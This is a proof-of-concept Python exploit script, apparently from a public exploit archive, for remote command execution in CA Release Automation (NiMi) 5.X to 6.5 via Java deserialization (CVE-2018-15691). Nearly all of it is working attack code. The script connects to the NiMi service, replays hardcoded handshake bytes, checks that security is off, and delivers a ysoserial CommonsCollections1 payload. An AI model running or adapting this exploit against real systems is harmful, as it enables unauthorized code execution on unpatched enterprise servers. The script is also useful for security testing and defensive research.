# Exploit Title: CA Release Automation NiMi 6.5 - Remote Command Execution
# Date: 2016-06-23
# Exploit Authors: Jakub Palaczynski, Maciej Grabiec
# Vendor Homepage: http://www.ca.com/
# Software Link: https://docops.ca.com/ca-release-automation/5-5-2/en/installation/deploy-agents/
# Version: CA Release Automation (NiMi) 5.X, 6.3, 6.4, 6.5
# CVE: CVE-2018-15691
# Info: CA Release Automation (NiMi) Remote Command Execution via Deserialization
# Info: Payloads generated using CommonsCollections1 from ysoserial work correctly.
# Info: Proof of Concept exploits NiMi service if security is turned off.

#!/usr/bin/python

import socket
import sys
import struct

if len(sys.argv) < 4:
    sys.stderr.write("[-]Usage: python %s <ip> <port> <payload_file> <target_nodeid - not mandatory>\n" % sys.argv[0])
    sys.stderr.write("[-]Exemple: python %s 10.0.0.1 6600 /tmp/payload.bin\n" % sys.argv[0])
    exit(1)
 
host = sys.argv[1]
port = sys.argv[2]
file = sys.argv[3]

# check if payload does not exceed specified value
payloadObj = open(file,'rb').read()
if len(payloadObj) > 5729:
    print 'Payload must be less than 5730 bytes. Try another one.'
    exit(1)

# open socket to nimi port
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print 'Connecting to node.'
sock.connect((host, int(port)))

# say hello to nimi
sock.recv(256)
sock.send('\x00\x00\x00\x0c\x0a\x04\x6e\x6f\x64\x65\x10\x0a\x72\x02\x08\x00') # first required message

# get Node ID
data = sock.recv(256)
name = data[5] + data[6:6+ord(data[5])]
if len(sys.argv) == 5:
    name = struct.pack(">B", len(sys.argv[4])) + sys.argv[4]

# check if security is enabled
sock.send('\x00\x00\x00\x1a\x0a\x04\x6e\x6f\x64\x65\x10\x0a\x7a\x10\x0a\x0c\x0a\x07\x30\x2e\x30\x2e\x30\x2e\x30\x10\x94\x3c\x10\x00') # second required message
check = sock.recv(256)
if check == "":
    print 'Security is enabled. Sorry.'
    exit(1)

# send payload
print 'Sending payload.'
header = '\x0a\x04\x6e\x6f\x64\x65\x10\x01\x1a' + name + '\x2a\xe4\x2c\x0a\xe1\x2c'
stage = header + payloadObj + '\x90' * (5729-len(payloadObj))
payload = struct.pack(">I", len(stage)) + stage

sock.sendall(payload)
sock.close()